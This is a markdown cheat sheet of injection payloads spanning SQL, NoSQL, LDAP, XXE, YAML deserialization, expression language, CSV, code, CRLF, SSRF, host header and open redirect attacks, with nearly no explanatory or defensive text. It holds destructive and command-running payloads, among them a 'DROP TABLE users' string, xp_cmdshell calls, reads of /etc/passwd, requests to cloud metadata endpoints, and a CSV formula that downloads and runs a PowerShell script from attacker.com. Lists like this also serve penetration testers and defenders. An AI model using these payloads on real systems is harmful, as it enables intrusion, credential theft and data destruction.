# Mixed Injection Attacks

## SQL Injection

### Basic SQL Injection

- Username: `admin' OR '1'='1`
- Password: `' OR '1'='1' --`
- Search: `'; DROP TABLE users; --`
- ID: `1' UNION SELECT NULL,NULL,NULL--`

### Advanced SQL Injection

```sql
' UNION SELECT username, password FROM users--
' UNION SELECT NULL, NULL, table_name FROM information_schema.tables--
'; EXEC xp_cmdshell('dir'); --
'; DECLARE @q varchar(8000); SELECT @q=0x73656c656374202a2066726f6d207573657273; EXEC(@q); --
```

### NoSQL Injection

```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
```

### MongoDB Injection

```javascript
db.users.find({username: {$where: "this.username == 'admin' && this.password.length > 0"}})
{$where: "sleep(5000)"}
```

## LDAP Injection

- Username: `*)(uid=*))(|(uid=*`
- Filter: `admin*)(|(userPassword=*))`
- Search: `*)(objectClass=*))(&(objectClass=*`

## XML External Entity (XXE)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>
<root>
  <data>&xxe;</data>
</root>
```

## XML Bomb (Billion Laughs)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

## YAML Deserialization

```yaml
!!python/object/apply:os.system
args: ['cat /etc/passwd']
```

```yaml
!!python/object/new:subprocess.Popen
args:
  - ['whoami']
```

## Expression Language Injection

- `${7*7}`
- `#{7*7}`
- `*{7*7}`
- `${{7*7}}`
- `${T(java.lang.Runtime).getRuntime().exec('calc')}`
- `${applicationScope}`
- `${sessionScope}`

## Log Injection

```
Username: admin\n[INFO] User admin logged in successfully\nSensitive data: password123
```

```
Input: test\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\nHTTP/1.1 200 OK\r\nSet-Cookie: admin=true
```

## CSV Injection

```
=cmd|'/c calc'!A1
=1+1+cmd|'/c powershell IEX(wget attacker.com/shell.ps1)'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-cmd|'/c calc'!A1
```

## Code Injection

```python
__import__('os').system('whoami')
exec("__import__('os').system('cat /etc/passwd')")
eval("__import__('subprocess').getoutput('ls -la')")
```

```javascript
eval('alert("XSS")')
Function('return process.env')()
require('child_process').exec('whoami')
```

## CRLF Injection

```
GET /page?param=value%0d%0aSet-Cookie:%20admin=true HTTP/1.1
GET /redirect?url=http://example.com%0d%0aX-Injected-Header:%20value HTTP/1.1
```

## Server-Side Request Forgery (SSRF)

- `http://localhost:8080/admin`
- `http://127.0.0.1:22`
- `http://169.254.169.254/latest/meta-data/`
- `http://metadata.google.internal/computeMetadata/v1/`
- `file:///etc/passwd`
- `gopher://127.0.0.1:25/xHELO`
- `dict://127.0.0.1:11211/stat`

## Host Header Injection

```
Host: attacker.com
Host: localhost
Host: 127.0.0.1
X-Forwarded-Host: attacker.com
X-Forwarded-For: 127.0.0.1
```

## Open Redirect

- `?redirect=//attacker.com`
- `?url=https://attacker.com`
- `?next=/\\attacker.com`
- `?return=javascript:alert('XSS')`

